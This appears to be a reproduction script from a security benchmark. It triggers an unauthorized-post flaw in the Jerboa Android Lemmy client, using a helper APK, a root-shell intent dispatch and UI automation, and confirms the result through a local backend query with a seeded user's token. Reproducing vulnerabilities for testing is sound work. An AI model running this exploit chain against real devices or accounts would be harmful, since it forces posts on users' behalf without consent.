#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"
LOG_FILE="$SCRIPT_DIR/fake_agent_log.log"

log() { printf '[vuln0] %s\n' "$*"; }

log "Starting vuln_scenario_0 for Jerboa"
log "Driving helper APK; require confirmed unauthorized post side effect"

set +e
ROOT_DIR="$ROOT_DIR" PYTHONPATH="$ROOT_DIR" python3 - "$LOG_FILE" <<'PY'
import json
import os
import time
import sys
import uuid
from pathlib import Path

from jerboa_probe_utils import (
    get_alice_jwt_from_seeded_credentials,
    get_jerboa_package,
    run_root_shell,
    run_helper_reproduction,
)

log_path = Path(sys.argv[1])
lines: list[str] = []

dispatch_body = f"mcb-post-{uuid.uuid4().hex}"
dispatch_ok, _ = run_helper_reproduction(
    mode="dispatch_send",
    body=dispatch_body,
    run_id=uuid.uuid4().hex,
)
lines.append(
    "mode=dispatch_send "
    f"transport_ok={str(dispatch_ok).lower()} "
    f"body={dispatch_body}"
)
if not dispatch_ok:
    # Fallback: dispatch directly from root shell (more reliable than UI-driven startActivity).
    package_name = get_jerboa_package()
    dispatch_ok, _ = run_root_shell(
        f"am start -n {package_name}/.MainActivity "
        f"-a android.intent.action.SEND --es android.intent.extra.TEXT {json.dumps(dispatch_body)} "
        "--type text/plain",
        timeout=60,
    )
    lines.append(
        f"mode=dispatch_send fallback=root_am_start package={package_name} used={str(dispatch_ok).lower()}"
    )

log_path.write_text("\n".join(lines) + "\n", encoding="utf-8")

# Do not claim the scenario is triggered unless we can confirm the state change
# from Alice's authenticated view of the backend.
post_ok = False
alice_jwt = get_alice_jwt_from_seeded_credentials()
if not alice_jwt:
    lines.append("mode=dispatch_send verdict=false reason=missing_alice_jwt")
else:
    try:
        import requests

        base_url = os.getenv("LEMMY_URL", "https://127.0.0.1:8536")
        root_dir = Path(os.environ["ROOT_DIR"]).resolve()
        ca_bundle = os.getenv("REQUESTS_CA_BUNDLE") or str(
            (root_dir.parent.parent / "tls" / "rootCA.pem")
        )
        verify = ca_bundle if Path(ca_bundle).exists() else False
        # Drive UI to actually submit the post (ACTION_SEND alone only prefills).
        # Use uiautomator2; fail closed if automation cannot complete.
        ui = log_path.parent / "create_post_automation.py"
        if not ui.exists():
            raise RuntimeError(f"missing UI automation helper: {ui}")
        import subprocess

        ui_run = subprocess.run(
            [sys.executable, str(ui), dispatch_body],
            capture_output=True,
            text=True,
            timeout=180,
        )
        lines.append(f"mode=dispatch_send ui_submit_exit={ui_run.returncode}")
        if ui_run.returncode != 0:
            lines.append("mode=dispatch_send verdict=false reason=ui_submit_failed")
            lines.append(f"mode=dispatch_send ui_submit_stderr={ui_run.stderr.strip()[:400]}")
            log_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
            raise SystemExit(2 if ui_run.returncode == 2 else 1)

        # Lemmy is typically served with a self-signed cert in CI.
        # Bound retries to reduce flakes from eventual consistency / noisy feeds.
        deadline = time.time() + 90
        while time.time() < deadline and not post_ok:
            response = requests.get(
                f"{base_url}/api/v3/post/list",
                # Lemmy expects auth as a query parameter; Authorization header
                # returns HTTP 400 in CI.
                params={"type_": "All", "limit": 200, "auth": alice_jwt},
                timeout=(5, 15),
                verify=verify,
            )
            if response.status_code == 200:
                posts = response.json().get("posts", [])
                for pv in posts:
                    body_candidates = [
                        pv.get("post_view", {}).get("post", {}).get("body", ""),
                        pv.get("post", {}).get("body", ""),
                        pv.get("post", {}).get("post", {}).get("body", ""),
                    ]
                    if any(dispatch_body == body for body in body_candidates):
                        post_ok = True
                        break
            if not post_ok:
                time.sleep(1)
        if not post_ok:
            lines.append("mode=dispatch_send verdict=false reason=post_not_observed")
    except SystemExit:
        raise
    except Exception as exc:
        lines.append(f"mode=dispatch_send verdict=false reason=backend_query_failed err={exc}")

log_path.write_text("\n".join(lines) + "\n", encoding="utf-8")

if not dispatch_ok or not post_ok:
    raise SystemExit(1)
PY

rc=$?
set -e
if [[ $rc -ne 0 ]]; then
  log "Scenario trigger failed (exit=$rc). Diagnostics:"
  if [[ -f "$LOG_FILE" ]]; then
    sed -n '1,200p' "$LOG_FILE" || true
  fi
  exit "$rc"
fi

log "Replay log written to: $LOG_FILE"
log "[+] Vulnerability successfully triggered."
